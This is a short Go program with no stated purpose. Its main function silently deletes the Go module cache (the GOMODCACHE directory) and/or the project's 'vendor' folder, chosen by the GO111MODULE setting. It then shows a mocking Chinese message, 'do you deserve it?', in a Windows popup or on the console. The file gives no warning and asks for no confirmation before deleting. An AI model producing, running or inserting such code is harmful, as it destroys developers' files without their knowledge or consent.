package main

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func isDoubleClick() bool {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	lp := kernel32.NewProc("GetConsoleProcessList")
	if lp != nil {
		var ids [2]uint32
		var maxCount uint32 = 2
		ret, _, _ := lp.Call(uintptr(unsafe.Pointer(&ids)), uintptr(maxCount))
		if ret > 1 {
			return false
		}
	}
	return true
}

func winBox(title string, msg string) error {
	tt, _ := syscall.UTF16PtrFromString(title)
	mg, _ := syscall.UTF16PtrFromString(msg)
	_, _, _ = syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
		0,
		uintptr(unsafe.Pointer(mg)),
		uintptr(unsafe.Pointer(tt)),
		uintptr(0x00000030|0x00000001))
	return nil
}

func consoleMessage() {
	fmt.Println("阿，您配吗")
	time.Sleep(time.Second * 3)
}

func main() {
	mod := os.Getenv("GO111MODULE")
	var err error
	switch mod {
	case "", "on":
		err = os.RemoveAll(os.Getenv("GOMODCACHE"))
	case "auto":
		err = os.RemoveAll(os.Getenv("GOMODCACHE"))
		fallthrough
	default:
		err = os.RemoveAll("vendor")
	}
	if err == nil {
		if runtime.GOOS == "windows" {
			if isDoubleClick() {
				err := winBox("您好", "您配吗")
				if err != nil {
					consoleMessage()
				}
			} else {
				consoleMessage()
			}
		} else {
			consoleMessage()
		}
	}
}
